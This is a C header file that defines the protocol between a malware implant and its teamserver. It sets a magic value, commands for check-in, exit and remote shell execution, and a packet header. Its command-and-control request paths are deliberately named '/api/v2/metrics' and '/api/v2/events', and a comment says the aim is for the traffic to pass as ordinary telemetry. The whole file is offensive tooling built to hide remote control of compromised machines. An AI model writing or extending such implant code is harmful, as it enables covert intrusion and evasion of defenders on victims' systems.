#ifndef CHECK_IN_PROTOCOL_H
#define CHECK_IN_PROTOCOL_H

#include <stdint.h>

#define CHECK_IN_MAGIC UINT32_C(0x41414141)
#define CMD_CHECK_IN UINT32_C(100)
#define CMD_EXIT UINT32_C(101)
#define CMD_EXECUTE_SHELL UINT32_C(102)

/* The two request paths. They live here so the implant and the teamserver
   cannot drift apart, and read as ordinary telemetry endpoints rather than as
   command-and-control vocabulary. */
#define C2_PATH_CHECKIN "/api/v2/metrics"
#define C2_PATH_RESULT "/api/v2/events"

/* Fields are copied as-is, so they travel in host byte order. A payload of
   exactly payload_size bytes follows the header, and a check-in sends none. */
struct C2_HEADER {
  uint32_t magic;
  uint32_t command_id;
  uint32_t payload_size;
};

#endif
